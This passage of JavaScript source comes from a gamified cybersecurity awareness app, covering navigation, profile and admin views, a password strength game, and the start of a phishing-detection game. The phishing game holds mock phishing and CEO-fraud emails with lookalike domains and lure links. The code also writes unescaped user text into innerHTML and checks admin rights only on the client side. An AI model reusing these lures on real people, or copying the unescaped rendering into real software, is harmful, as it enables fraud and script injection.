function updateNavStats(){const u=getUser(),lvl=getUserLevel(u);const x=document.getElementById('nav-xp'),l=document.getElementById('nav-level');if(x)x.textContent='⚡ '+u.xp+' XP';if(l)l.textContent='★ Lv.'+lvl.level+' '+lvl.title;}
function navigateTo(view,data){currentView=view;window._viewData=data||null;renderContent();document.querySelectorAll('.nav-link').forEach(l=>l.classList.remove('active'));}
function renderContent(){
  const c=document.getElementById('app-content');
  switch(currentView){case 'home':renderHome(c);break;case 'hub':renderHub(c);break;case 'game':renderGame(c);break;case 'intro':renderIntro(c);break;
    case 'resources':renderResources(c);break;case 'profile':renderProfile(c);break;case 'admin':renderAdmin(c);break;default:renderHome(c);}
}
function logout(){currentUser=null;document.getElementById('main-app').style.display='none';showAuthScreen();}

// ==================== HOME ====================
function renderHome(c){
  const u=getUser(),lvl=getUserLevel(u),announce=localStorage.getItem('cybersafe_announce');
  c.innerHTML=`<div class="content-area"><div class="fade-in">
    ${announce?`<div class="info-banner warning" style="margin-bottom:24px;"><strong>📢 Announcement:</strong> ${announce}</div>`:''}
    <div class="mode-hero">
      <h2 class="glitch" data-text="SELECT YOUR MISSION">SELECT YOUR MISSION</h2>
      <p>Choose your training path and begin your journey into the world of cybersecurity</p>
    </div>
    <div class="mode-grid">
      <div class="mode-card awareness" onclick="navigateTo('hub',{mode:'awareness'})">
        <div class="mode-card-glow"></div>
        <div class="mode-card-content">
          <div class="mode-icon-wrap"><div class="mode-icon">🛡️</div><div class="mode-icon-ring"></div></div>
          <h3>CYBER AWARENESS</h3>
          <div class="mode-subtitle">8 Interactive Missions</div>
          <p>Master everyday cybersecurity skills. Learn to protect yourself from phishing, social engineering, weak passwords, and online threats through hands-on simulations.</p>
          <div class="mode-for">For everyone — students, employees, and everyday internet users</div>
          <div class="mode-tags"><span class="mode-tag">PHISHING</span><span class="mode-tag">PASSWORDS</span><span class="mode-tag">PRIVACY</span><span class="mode-tag">SOCIAL ENGINEERING</span><span class="mode-tag">RANSOMWARE</span></div>
          <div class="mode-enter">ENTER TRAINING →</div>
        </div>
      </div>
      <div class="mode-card technical" onclick="navigateTo('hub',{mode:'technical'})">
        <div class="mode-card-glow"></div>
        <div class="mode-card-content">
          <div class="mode-icon-wrap"><div class="mode-icon">⚔️</div><div class="mode-icon-ring"></div></div>
          <h3>CYBER TRAINING</h3>
          <div class="mode-subtitle">8 Technical Challenges</div>
          <p>Dive into real cybersecurity concepts. Practice encryption, CTF challenges, network defense, forensics, and vulnerability analysis in hands-on labs.</p>
          <div class="mode-for">For aspiring security professionals and curious minds</div>
          <div class="mode-tags"><span class="mode-tag">ENCRYPTION</span><span class="mode-tag">CTF</span><span class="mode-tag">FORENSICS</span><span class="mode-tag">SQL INJECTION</span><span class="mode-tag">XSS</span></div>
          <div class="mode-enter">ENTER TRAINING →</div>
        </div>
      </div>
    </div>
    <div class="stats-row">
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-cyan)">${u.xp}</div><div class="stat-label">Total XP</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-purple)">Lv.${lvl.level}</div><div class="stat-label">${lvl.title}</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-green)">${u.completedGames.length}/16</div><div class="stat-label">Missions Done</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-pink)">${u.achievements.length}/${ACHIEVEMENTS.length}</div><div class="stat-label">Achievements</div></div>
    </div>
  </div></div>`;
}

// ==================== GAME HUB ====================
const AWARENESS_GAMES = [
  {id:'password',icon:'🔑',title:'Password Personality Test',desc:'Enter passwords and get brutally honest AI feedback about your security habits.',xp:150,diff:'easy',color:'var(--neon-cyan)'},
  {id:'phishing',icon:'🎣',title:'Phishing Detective',desc:'Analyze suspicious emails in your inbox. Spot the scams before they steal your data.',xp:200,diff:'medium',color:'var(--neon-green)'},
  {id:'escape',icon:'🚪',title:'Digital Escape Room',desc:'Solve cybersecurity puzzles across multiple rooms to break free from a compromised office.',xp:300,diff:'hard',color:'var(--neon-purple)'},
  {id:'privacy',icon:'🔒',title:'Privacy Protector',desc:'Manage digital privacy settings. Every toggle has real consequences for your safety.',xp:200,diff:'medium',color:'var(--neon-orange)'},
  {id:'social',icon:'🎭',title:'Social Engineering Simulator',desc:'Chat with NPCs trying to manipulate you. Recognize urgency, impersonation, and exploitation.',xp:250,diff:'hard',color:'var(--neon-pink)'},
  {id:'fakenews',icon:'📰',title:'Fake News Firewall',desc:'Separate real cyber threats from misinformation before panic spreads.',xp:150,diff:'easy',color:'var(--neon-yellow)'},
  {id:'wifi',icon:'📡',title:'WiFi Danger Zone',desc:'Identify safe vs dangerous networks. Learn about evil twins and MITM attacks.',xp:200,diff:'medium',color:'var(--neon-blue)'},
  {id:'ransomware',icon:'💰',title:'Ransomware Rescue',desc:'Your system is encrypted. Make critical decisions under pressure in this crisis simulation.',xp:300,diff:'hard',color:'var(--neon-red)'},
];
const TECHNICAL_GAMES = [
  {id:'cipher',icon:'🔐',title:'Cipher Challenge',desc:'Decode messages encrypted with Caesar, binary, hex, Base64, and more.',xp:200,diff:'medium',color:'var(--neon-cyan)'},
  {id:'codebreaker',icon:'💻',title:'Code Breaker',desc:'Crack authentication puzzles using pattern recognition and hash analysis.',xp:250,diff:'hard',color:'var(--neon-green)'},
  {id:'ctf',icon:'🏴',title:'Mini CTF Challenge',desc:'Find hidden flags in encoded messages and file data. Classic Capture The Flag.',xp:300,diff:'hard',color:'var(--neon-purple)'},
  {id:'network',icon:'🌐',title:'Network Defender',desc:'Protect a live network from DDoS, SQL injection, brute force, and more.',xp:250,diff:'hard',color:'var(--neon-orange)'},
  {id:'forensics',icon:'🔍',title:'Digital Forensics Lab',desc:'Investigate a cyber incident. Analyze logs, trace IPs, and find the attacker.',xp:300,diff:'hard',color:'var(--neon-pink)'},
  {id:'sqli',icon:'💉',title:'SQL Injection Lab',desc:'Learn how SQL injection attacks work and how to prevent them.',xp:250,diff:'hard',color:'var(--neon-yellow)'},
  {id:'xss',icon:'⚡',title:'XSS Playground',desc:'Explore cross-site scripting vulnerabilities and learn input sanitization.',xp:250,diff:'hard',color:'var(--neon-blue)'},
  {id:'stego',icon:'👁️',title:'Steganography Studio',desc:'Decode hidden messages in text, metadata, and file headers.',xp:200,diff:'medium',color:'var(--neon-red)'},
];

function renderHub(c){
  const mode=window._viewData?.mode||'awareness'; currentMode=mode;
  const games=mode==='awareness'?AWARENESS_GAMES:TECHNICAL_GAMES;
  const title=mode==='awareness'?'🛡️ CYBER AWARENESS MISSIONS':'⚔️ CYBER TRAINING MISSIONS';
  const u=getUser();
  const completedCount = games.filter(g => u.completedGames.includes(g.id)).length;
  c.innerHTML=`<div class="content-area"><div class="fade-in">
    <div class="hub-header">
      <h2>${title}</h2>
      <div style="display:flex;align-items:center;gap:16px;">
        <span style="font-family:var(--font-mono);font-size:13px;color:var(--text-muted);">${completedCount}/${games.length} Complete</span>
        <button class="hub-back" onclick="navigateTo('home')">← BACK TO HQ</button>
      </div>
    </div>
    <div class="info-banner"><strong>Mission Briefing:</strong> ${mode==='awareness'?'These missions teach everyday cybersecurity awareness. Each mission starts with a briefing that explains the topic, then drops you into an interactive challenge.':'These missions cover real cybersecurity concepts. Each starts with a concept briefing, then challenges you with hands-on labs and puzzles.'}</div>
    <div class="games-grid">${games.map(g=>`
      <div class="game-card" style="--gc:${g.color}" onclick="navigateTo('intro',{gameId:'${g.id}',mode:'${mode}'})">
        ${u.completedGames.includes(g.id)?'<div class="game-card-badge">✓ COMPLETE</div>':''}
        <div class="game-card-icon">${g.icon}</div><h3>${g.title}</h3><p>${g.desc}</p>
        <div class="game-card-footer"><span class="game-xp">+${g.xp} XP</span><span class="game-difficulty diff-${g.diff}">${g.diff}</span></div>
      </div>`).join('')}</div>
  </div></div>`;
}

// ==================== INTRO / BRIEFING PAGE ====================
function renderIntro(c){
  const {gameId,mode}=window._viewData||{};
  const intro=GAME_INTROS[gameId];
  const theme=GAME_THEMES[gameId];
  if(!intro){navigateTo('game',{gameId,mode});return;}
  const allGames=[...AWARENESS_GAMES,...TECHNICAL_GAMES];
  const gm=allGames.find(g=>g.id===gameId);
  const u=getUser();
  const isComplete=u.completedGames.includes(gameId);

  c.innerHTML=`<div class="content-area"><div class="intro-page fade-in" style="--intro-accent:${intro.color};">
    <div class="intro-back-row">
      <button class="game-back-btn" onclick="navigateTo('hub',{mode:'${mode}'})">← BACK TO MISSIONS</button>
      ${isComplete?'<span class="intro-complete-badge">✓ COMPLETED</span>':''}
    </div>

    <div class="intro-hero" style="background:${theme.bg};box-shadow:${theme.glow};">
      <div class="intro-hero-icon" style="text-shadow:0 0 40px ${intro.color}40;">${intro.icon}</div>
      <div class="intro-hero-text">
        <h1 style="color:${intro.color};">${intro.title}</h1>
        <p class="intro-hero-subtitle">${intro.subtitle}</p>
      </div>
    </div>

    <div class="intro-grid">
      <div class="intro-section intro-overview">
        <div class="intro-section-label" style="color:${intro.color};">📋 OVERVIEW</div>
        <p>${intro.overview}</p>
      </div>

      <div class="intro-section intro-facts">
        <div class="intro-section-label" style="color:${intro.color};">📊 DID YOU KNOW?</div>
        ${intro.facts.map(f=>`<div class="intro-fact-item"><span class="intro-fact-bullet" style="background:${intro.color};">!</span><span>${f}</span></div>`).join('')}
      </div>

      <div class="intro-section intro-concepts">
        <div class="intro-section-label" style="color:${intro.color};">🧠 KEY CONCEPTS</div>
        ${intro.concepts.map(c=>`<div class="intro-concept-item"><span class="intro-concept-dot" style="background:${intro.color};"></span><span>${c}</span></div>`).join('')}
      </div>

      <div class="intro-section intro-mission">
        <div class="intro-section-label" style="color:${intro.color};">🎯 YOUR MISSION</div>
        <p>${intro.whatYouLearn}</p>
        <div class="intro-reward"><span>🏆 Reward:</span> <strong style="color:${intro.color};">+${gm?gm.xp:0} XP</strong></div>
      </div>
    </div>

    <button class="intro-start-btn" style="--btn-color:${intro.color};" onclick="navigateTo('game',{gameId:'${gameId}',mode:'${mode}'})">
      <span class="intro-start-icon">▶</span>
      <span>${isComplete?'REPLAY MISSION':'START MISSION'}</span>
    </button>
  </div></div>`;
}

// ==================== RESOURCES ====================
function renderResources(c){
  const res=[
    {icon:'🏴‍☠️',title:'Hack The Box',desc:'Practice pentesting with real-world challenge machines.',url:'https://www.hackthebox.com',cat:'Platform'},
    {icon:'🎯',title:'TryHackMe',desc:'Learn cybersecurity through hands-on gamified labs.',url:'https://tryhackme.com',cat:'Platform'},
    {icon:'🏁',title:'PicoCTF',desc:'Free CTF challenges by Carnegie Mellon University.',url:'https://picoctf.org',cat:'CTF'},
    {icon:'📚',title:'OWASP Top 10',desc:'The most critical web application security risks.',url:'https://owasp.org/www-project-top-ten/',cat:'Guide'},
    {icon:'🔐',title:'CyberChef',desc:'Encode, decode, encrypt, and analyze data in your browser.',url:'https://gchq.github.io/CyberChef/',cat:'Tool'},
    {icon:'🎮',title:'OverTheWire',desc:'Practice security through wargames. Start with Bandit.',url:'https://overthewire.org/wargames/',cat:'Platform'},
    {icon:'📖',title:'Cybrary',desc:'Free online cybersecurity training and career development.',url:'https://www.cybrary.it',cat:'Course'},
    {icon:'🔬',title:'PortSwigger Academy',desc:'Free web security training from Burp Suite creators.',url:'https://portswigger.net/web-security',cat:'Course'},
    {icon:'📰',title:'Krebs on Security',desc:'In-depth security news and investigation.',url:'https://krebsonsecurity.com',cat:'News'},
    {icon:'🏆',title:'CTFtime',desc:'Track upcoming CTF competitions worldwide.',url:'https://ctftime.org',cat:'CTF'},
  ];
  c.innerHTML=`<div class="content-area"><div class="fade-in">
    <div class="hub-header"><h2>📡 CYBER KNOWLEDGE DATABASE</h2></div>
    <div class="info-banner"><strong>Intel Report:</strong> Curated cybersecurity learning resources, platforms, tools, and communities.</div>
    <div class="resources-grid">${res.map(r=>`
      <div class="resource-card" onclick="window.open('${r.url}','_blank')">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
          <span style="font-size:28px">${r.icon}</span>
          <span class="mode-tag" style="background:rgba(0,240,255,0.08);color:var(--neon-cyan);border:1px solid rgba(0,240,255,0.2)">${r.cat}</span>
        </div><h4>${r.title}</h4><p>${r.desc}</p><span class="resource-link">Visit →</span>
      </div>`).join('')}</div>
  </div></div>`;
}

// ==================== PROFILE (CUSTOMIZABLE) ====================
function renderProfile(c){
  const u=getUser(),lvl=getUserLevel(u),next=getNextLevel(u),xpPct=next?Math.min(((u.xp-lvl.xpReq)/(next.xpReq-lvl.xpReq)*100),100):100;
  const joinDate = u.joinDate || 'Unknown';
  c.innerHTML=`<div class="content-area"><div class="fade-in">
    <div class="hub-header"><h2>👤 AGENT PROFILE</h2></div>
    <div class="profile-grid">
      <div>
        <div class="profile-card" style="margin-bottom:20px;">
          <div class="profile-avatar-section">
            <div class="profile-avatar-large" id="profile-avatar-display" onclick="toggleAvatarPicker()">${u.avatar||'🤖'}</div>
            <div class="profile-avatar-edit-hint">Click to change</div>
          </div>
          <div id="avatar-picker" class="avatar-picker" style="display:none;">
            <div class="avatar-picker-title">CHOOSE YOUR AVATAR</div>
            <div class="avatar-picker-grid">
              ${AVATAR_OPTIONS.map(a=>`<div class="avatar-option ${a===(u.avatar||'🤖')?'selected':''}" onclick="selectAvatar('${a}')">${a}</div>`).join('')}
            </div>
          </div>

          <div class="profile-edit-section">
            <div class="profile-edit-field">
              <label class="profile-edit-label">DISPLAY NAME</label>
              <div class="profile-edit-row">
                <input type="text" class="cyber-input profile-input" id="profile-nickname" value="${u.nickname||currentUser}" maxlength="20" />
                <button class="cyber-btn-sm" onclick="saveProfileField('nickname')">SAVE</button>
              </div>
            </div>
            <div class="profile-edit-field">
              <label class="profile-edit-label">TITLE</label>
              <div class="profile-edit-row">
                <input type="text" class="cyber-input profile-input" id="profile-title" value="${u.title||'Cyber Trainee'}" maxlength="30" placeholder="Your custom title..." />
                <button class="cyber-btn-sm" onclick="saveProfileField('title')">SAVE</button>
              </div>
            </div>
            <div class="profile-edit-field">
              <label class="profile-edit-label">BIO</label>
              <div class="profile-edit-row">
                <textarea class="cyber-input profile-input" id="profile-bio" maxlength="120" rows="2" placeholder="Tell us about yourself...">${u.bio||''}</textarea>
                <button class="cyber-btn-sm" onclick="saveProfileField('bio')">SAVE</button>
              </div>
            </div>
          </div>

          <div class="profile-divider"></div>

          <div class="profile-rank">${lvl.title}</div>
          <div class="xp-bar-container"><div class="xp-bar-fill" style="width:${xpPct}%"></div></div>
          <div class="xp-bar-label">${u.xp} XP${next?' / '+next.xpReq+' XP':' (MAX)'}</div>
        </div>

        <div class="profile-card">
          <h3 style="font-family:var(--font-display);font-size:14px;color:var(--neon-cyan);margin-bottom:14px;">LEVEL PROGRESSION</h3>
          ${LEVELS.map(l=>`<div style="display:flex;align-items:center;gap:10px;padding:6px 0;opacity:${u.xp>=l.xpReq?1:0.3}">
            <span style="font-family:var(--font-mono);font-size:12px;color:${u.xp>=l.xpReq?'var(--neon-green)':'var(--text-muted)'};width:40px;">Lv.${l.level}</span>
            <span style="font-size:13px;flex:1">${l.title}</span>
            <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">${l.xpReq} XP</span>
          </div>`).join('')}
        </div>
      </div>
      <div>
        <div class="game-panel" style="margin-bottom:20px;">
          <h3>🏆 ACHIEVEMENTS (${u.achievements.length}/${ACHIEVEMENTS.length})</h3>
          <div class="achievements-grid">${ACHIEVEMENTS.map(a=>`
            <div class="achiev-card ${u.achievements.includes(a.id)?'unlocked':'locked'}" title="${u.achievements.includes(a.id)?a.desc:'???'}">
              <div class="achiev-card-icon">${a.icon}</div>
              <div class="achiev-card-name">${u.achievements.includes(a.id)?a.name:'???'}</div>
            </div>`).join('')}</div>
        </div>
        <div class="game-panel">
          <h3>📊 MISSION LOG</h3>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
            ${[...AWARENESS_GAMES,...TECHNICAL_GAMES].map(g=>`
              <div style="display:flex;align-items:center;gap:8px;padding:6px 10px;background:rgba(0,0,0,0.2);border-radius:6px;">
                <span>${g.icon}</span><span style="flex:1;font-size:12px;">${g.title}</span>
                <span style="font-family:var(--font-mono);font-size:10px;color:${u.completedGames.includes(g.id)?'var(--neon-green)':'var(--text-muted)'}">${u.completedGames.includes(g.id)?'✓':'—'}</span>
              </div>`).join('')}
          </div>
        </div>
      </div>
    </div>
  </div></div>`;
}

window.toggleAvatarPicker = function(){
  const picker = document.getElementById('avatar-picker');
  picker.style.display = picker.style.display === 'none' ? 'block' : 'none';
};

window.selectAvatar = function(emoji){
  const u = getUser();
  u.avatar = emoji;
  saveUsers();
  document.getElementById('profile-avatar-display').textContent = emoji;
  document.querySelectorAll('.avatar-option').forEach(el => {
    el.classList.toggle('selected', el.textContent === emoji);
  });
  // Update nav avatar
  const navAvatar = document.querySelector('.nav-avatar');
  if(navAvatar) navAvatar.textContent = emoji;
};

window.saveProfileField = function(field){
  const u = getUser();
  const el = document.getElementById('profile-' + field);
  if(!el) return;
  const val = el.value.trim();
  if(field === 'nickname' && val.length < 1) return;
  u[field] = val;
  saveUsers();
  // Flash save confirmation
  const btn = el.parentElement.querySelector('button');
  if(btn) {
    const orig = btn.textContent;
    btn.textContent = '✓ SAVED';
    btn.style.color = 'var(--neon-green)';
    setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1500);
  }
  // Update nav if nickname changed
  if(field === 'nickname') {
    const navName = document.querySelector('.nav-user-btn span');
    if(navName) navName.textContent = val;
  }
};

// ==================== ADMIN ====================
function renderAdmin(c){
  const u=getUser(); if(u.role!=='admin')return c.innerHTML='<div class="content-area"><div class="game-panel"><h3>ACCESS DENIED</h3></div></div>';
  const allUsers=Object.entries(users).map(([k,v])=>({username:k,...v}));
  c.innerHTML=`<div class="content-area"><div class="fade-in">
    <div class="hub-header"><h2 style="color:var(--neon-red);">⚙️ ADMIN CONTROL PANEL</h2></div>
    <div class="stats-row" style="max-width:100%;margin-bottom:24px;">
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-cyan)">${allUsers.length}</div><div class="stat-label">Total Users</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-green)">${allUsers.reduce((s,u)=>s+u.xp,0)}</div><div class="stat-label">Total XP</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-purple)">${allUsers.reduce((s,u)=>s+u.completedGames.length,0)}</div><div class="stat-label">Games Done</div></div>
      <div class="stat-card"><div class="stat-value" style="color:var(--neon-orange)">16</div><div class="stat-label">Active Games</div></div>
    </div>
    <div class="admin-grid">
      <div class="admin-panel"><h3>👥 USER MANAGEMENT</h3>
        ${allUsers.map(u=>`<div class="admin-user-row">
          <div style="display:flex;align-items:center;gap:10px;">
            <span style="font-size:20px;">${u.avatar||'🤖'}</span>
            <div><div class="admin-user-name">${u.nickname||u.username} <span style="color:var(--text-muted);font-size:11px;">@${u.username}</span> ${u.role==='admin'?'<span style="color:var(--neon-red);font-size:10px;">ADMIN</span>':''}</div>
            <div style="font-size:11px;color:var(--text-muted)">XP:${u.xp} | Games:${u.completedGames.length} | ${u.title||'No title'}</div></div>
          </div>
          <button class="admin-btn-sm danger" onclick="resetUser('${u.username}')">RESET</button>
        </div>`).join('')}
      </div>
      <div class="admin-panel"><h3>📢 ANNOUNCEMENTS</h3>
        <textarea class="cyber-input" id="admin-announce" rows="3" placeholder="Type announcement...">${localStorage.getItem('cybersafe_announce')||''}</textarea>
        <button class="cyber-btn" style="margin-top:10px;width:100%;" onclick="saveAnnouncement()">BROADCAST</button>
        <button class="cyber-btn pink" style="margin-top:6px;width:100%;font-size:11px;" onclick="clearAnnouncement()">CLEAR ANNOUNCEMENT</button>
      </div>
    </div>
  </div></div>`;
}
function resetUser(u){if(u==='admin')return;users[u].xp=0;users[u].achievements=[];users[u].completedGames=[];saveUsers();renderContent();}
function saveAnnouncement(){localStorage.setItem('cybersafe_announce',document.getElementById('admin-announce').value);showXPPopup(0);/* just flash */}
function clearAnnouncement(){localStorage.removeItem('cybersafe_announce');document.getElementById('admin-announce').value='';renderContent();}

// ==================== GAME ROUTER (with theme) ====================
function renderGame(c){
  const {gameId,mode}=window._viewData||{};
  const theme=GAME_THEMES[gameId];
  c.innerHTML=`<div class="content-area"><div class="game-container fade-in" id="game-root" style="${theme?'background-image:'+theme.bg+';':''}"></div></div>`;
  const root=document.getElementById('game-root');
  const allGames=[...AWARENESS_GAMES,...TECHNICAL_GAMES];
  const gm=allGames.find(g=>g.id===gameId);
  if(!gm){root.innerHTML='<p>Game not found</p>';return;}
  // Apply theme accent as CSS variable
  if(theme) root.style.setProperty('--game-accent', theme.accent);
  root.innerHTML=`<div class="game-header" style="${theme?'border-bottom-color:'+theme.accent+'30;':''}"><button class="game-back-btn" onclick="navigateTo('hub',{mode:'${mode}'})">← BACK</button><div class="game-title" style="${theme?'color:'+theme.accent+';':''}">${gm.icon} ${gm.title}</div></div><div id="game-content"></div>`;
  const gc=document.getElementById('game-content');
  const fn={password:gamePassword,phishing:gamePhishing,escape:gameEscape,privacy:gamePrivacy,social:gameSocial,fakenews:gameFakeNews,wifi:gameWifi,ransomware:gameRansomware,cipher:gameCipher,codebreaker:gameCodebreaker,ctf:gameCTF,network:gameNetwork,forensics:gameForensics,sqli:gameSQLi,xss:gameXSS,stego:gameStego};
  if(fn[gameId])fn[gameId](gc); else gc.innerHTML='<p>Coming soon...</p>';
}

// ==================== PASSWORD PERSONALITY TEST ====================
function gamePassword(gc){
  const reactions=[
    {regex:/^(.)\1+$/,msg:"You literally just held down one key. A hamster running on a keyboard would be more secure.",tip:"Never use repeating characters. Mix uppercase, lowercase, numbers, and symbols."},
    {regex:/^(123456|password|qwerty|abc123|letmein|welcome|monkey|dragon|master|admin)$/i,msg:"This password appears in every 'Worst Passwords' list since 2004. Hackers start with YOUR password.",tip:"Avoid common passwords. These are the first thing attackers try."},
    {regex:/^[a-z]{1,5}$/i,msg:"This is less a password and more of a gentle suggestion. A dictionary attack cracks this before you finish reading this.",tip:"Short passwords are extremely vulnerable. Use at least 12 characters."},
    {regex:/^[a-z]{6,8}$/i,msg:"Just lowercase? That's like locking your car but leaving the windows down and keys on the dashboard.",tip:"Add uppercase letters, numbers, and special characters (!@#$%^&*)."},
  ];
  const strengthChecks=[
    {regex:/.{12,}/,label:'12+ characters',weight:25},{regex:/[a-z]/,label:'Lowercase',weight:10},{regex:/[A-Z]/,label:'Uppercase',weight:15},
    {regex:/[0-9]/,label:'Numbers',weight:15},{regex:/[^a-zA-Z0-9]/,label:'Special chars',weight:20},{regex:/^(?!.*(.)(\1{2,}))/,label:'No repeats',weight:15}
  ];
  let tested=0;
  gc.innerHTML=`<div class="info-banner"><strong>Mission:</strong> Enter any password and our AI analyst will evaluate your security habits. No passwords are stored.</div>
    <div class="game-panel"><h3>ENTER PASSWORD FOR ANALYSIS</h3>
      <div style="display:flex;gap:12px;margin-bottom:10px;"><input type="text" class="cyber-input" id="pw-input" placeholder="Type a password..." autocomplete="off" /><button class="cyber-btn" onclick="analyzePassword()">ANALYZE</button></div>
      <div class="password-meter"><div class="password-meter-fill" id="pw-meter" style="width:0%"></div></div>
      <div style="display:flex;justify-content:space-between;margin-top:6px;">
        <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)" id="pw-strength-label">Enter a password</span>
        <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)" id="pw-crack-time"></span>
      </div></div><div id="pw-result"></div><div id="pw-checklist" class="game-panel" style="display:none;"><h3>SECURITY CHECKLIST</h3><div id="pw-checks"></div></div>`;
  document.getElementById('pw-input').addEventListener('input',function(){
    const pw=this.value; if(!pw){document.getElementById('pw-meter').style.width='0%';return;}
    let score=0; strengthChecks.forEach(c=>{if(c.regex.test(pw))score+=c.weight;}); score=Math.min(score,100);
    const meter=document.getElementById('pw-meter'); meter.style.width=score+'%';
    meter.style.background=score<30?'var(--neon-red)':score<60?'var(--neon-orange)':score<80?'var(--neon-yellow)':'var(--neon-green)';
    document.getElementById('pw-strength-label').textContent=['CRITICAL','WEAK','FAIR','STRONG','EXCELLENT'][Math.min(Math.floor(score/25),4)];
    const charset=((/[a-z]/.test(pw)?26:0)+(/[A-Z]/.test(pw)?26:0)+(/[0-9]/.test(pw)?10:0)+(/[^a-zA-Z0-9]/.test(pw)?32:0))||1;
    const secs=Math.pow(charset,pw.length)/1e10; let ts;
    if(secs<0.001)ts='Instantly';else if(secs<60)ts=Math.ceil(secs)+' sec';else if(secs<3600)ts=Math.ceil(secs/60)+' min';
    else if(secs<86400)ts=Math.ceil(secs/3600)+' hrs';else if(secs<31536000)ts=Math.ceil(secs/86400)+' days';
    else if(secs<31536000*1000)ts=Math.ceil(secs/31536000)+' yrs';else ts='1M+ years';
    document.getElementById('pw-crack-time').textContent='⏱ '+ts;
  });
  window.analyzePassword=function(){
    const pw=document.getElementById('pw-input').value; if(!pw)return; tested++;
    let reaction=null; for(const r of reactions){if(r.regex.test(pw)){reaction=r;break;}}
    let score=0; strengthChecks.forEach(c=>{if(c.regex.test(pw))score+=c.weight;}); score=Math.min(score,100);
    if(!reaction){
      if(score>=80)reaction={msg:"Now THAT is a password. Centuries to crack. I'm genuinely impressed.",tip:"Great job! Use a password manager for passwords like this."};
      else if(score>=60)reaction={msg:"Not bad! Room for improvement but you're clearly trying.",tip:"Add more length and special characters. Try a passphrase."};
      else reaction={msg:"It's... something. Like wearing a paper bag as armor.",tip:"Need more complexity. Mix all character types, aim for 12+ chars."};
    }
    document.getElementById('pw-result').innerHTML=`<div class="game-panel slide-up"><h3>🤖 AI ANALYST:</h3>
      <div class="terminal-box" style="margin-bottom:16px;">>${' '}Analyzing: ${'*'.repeat(pw.length)}\n> Length: ${pw.length}\n> Score: ${score}/100\n\n"${reaction.msg}"</div>
      <div class="info-banner ${score>=70?'success':score>=40?'warning':''}"><strong>💡 Tip:</strong> ${reaction.tip}</div></div>`;
    document.getElementById('pw-checklist').style.display='block';
    document.getElementById('pw-checks').innerHTML=strengthChecks.map(c=>`<div style="display:flex;align-items:center;gap:10px;padding:6px 0;">
      <span style="color:${c.regex.test(pw)?'var(--neon-green)':'var(--neon-red)'};">${c.regex.test(pw)?'✓':'✗'}</span><span style="font-size:13px;">${c.label}</span></div>`).join('');
    if(tested>=3&&score>=70){addXP(150);markGameComplete('password');unlockAchievement('password_pro');}
  };
}

// ==================== PHISHING DETECTIVE ====================
function gamePhishing(gc){
  const emails=[
    {from:'security@amaz0n-alerts.com',subject:'⚠️ Account compromised!',body:'Dear customer,\n\nUnusual login from Russia detected.\n\nVerify now: http://amaz0n-security.tk/verify\n\nYou have 24 hours before suspension.\n\nAmazon Security',phish:true,clues:['Misspelled domain (amaz0n)','Suspicious .tk link','Creates urgency','Generic greeting']},
    {from:'it-helpdesk@company.com',subject:'Server Maintenance This Weekend',body:'Hi team,\n\nScheduled maintenance Saturday 2-6 AM.\nVPN and shared drives unavailable.\n\nSave files locally before Friday.\n\nIT Team',phish:false,clues:['Internal domain','Routine notice','No suspicious links']},
    {from:'no-reply@paypa1.com',subject:'Payment of $847.99 Confirmed',body:'You authorized $847.99 to Electronics Hub.\n\nDispute: http://paypa1-dispute.net/claim\n\nPayPal Protection',phish:true,clues:['Domain uses "1" not "l"','External dispute link','Triggers panic']},
    {from:'newsletter@techcrunch.com',subject:'This Week in Tech',body:'Top stories:\n1. AI advances\n2. VPN vulnerability found\n3. Google strengthens 2FA\n\nRead more: techcrunch.com/weekly\n\nUnsubscribe | Privacy',phish:false,clues:['Legitimate domain','Standard newsletter','Unsubscribe option']},
    {from:'ceo@company-emergency.com',subject:'URGENT: Wire Transfer Today',body:'I need a $25,000 wire transfer before 3 PM.\n\nConfidential — don\'t discuss with anyone.\n\nBank details in next email.\n\nJohn (CEO)',phish:true,clues:['Wrong domain','Urgent financial request','Demands secrecy','Classic BEC attack']},
    {from:'team@github.com',subject:'New sign-in detected',body:'New sign-in:\n• Chrome on Windows 11\n• San Francisco, CA\n\nIf this was you, ignore this.\nOtherwise: github.com/settings/security\n\nGitHub Security',phish:false,clues:['Legitimate domain','Specific details','Official URL','No forced action']},
    {from:'admin@m1crosoft-support.com',subject:'Microsoft 365 Expires Today!',body:'Your subscription expired. Files deleted in 48 hours.\n\nRenew: http://m1crosoft-renew.xyz/office365\n\nMicrosoft Support',phish:true,clues:['Misspelled with "1"','Suspicious .xyz link','Threatens deletion']},
    {from:'hr@yourcompany.com',subject:'Updated Holiday Schedule 2025',body:'Updated holidays attached.\n\nNotable: Juneteenth added, winter break extended.\n\nUpdate calendars.\n\nHR Department',phish:false,clues:['Internal HR domain','Routine update','Professional tone']},
  ];
  let cur=0,score=0;
  function render(){
    if(cur>=emails.length){
      const pct=Math.round(score/emails.length*100);
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>📊 COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}</div><div class="score-label">Correct</div></div>
        <div class="score-item"><div class="score-value" style="color:var(--neon-cyan)">${pct}%</div><div class="score-label">Accuracy</div></div></div>
        <div class="result-box ${pct>=75?'success':'fail'}"><h4>${pct>=75?'Excellent!':'Keep Practicing!'}</h4></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
      addXP(200);markGameComplete('phishing');if(pct>=90)unlockAchievement('phishing_expert');return;
    }
    const e=emails[cur];
    gc.innerHTML=`<div class="info-banner"><strong>Email ${cur+1}/${emails.length}</strong></div>
      <div class="game-panel"><div class="email-item selected">
        <div class="email-from" style="color:var(--neon-cyan)">${e.from}</div>
        <div class="email-subject">${e.subject}</div>
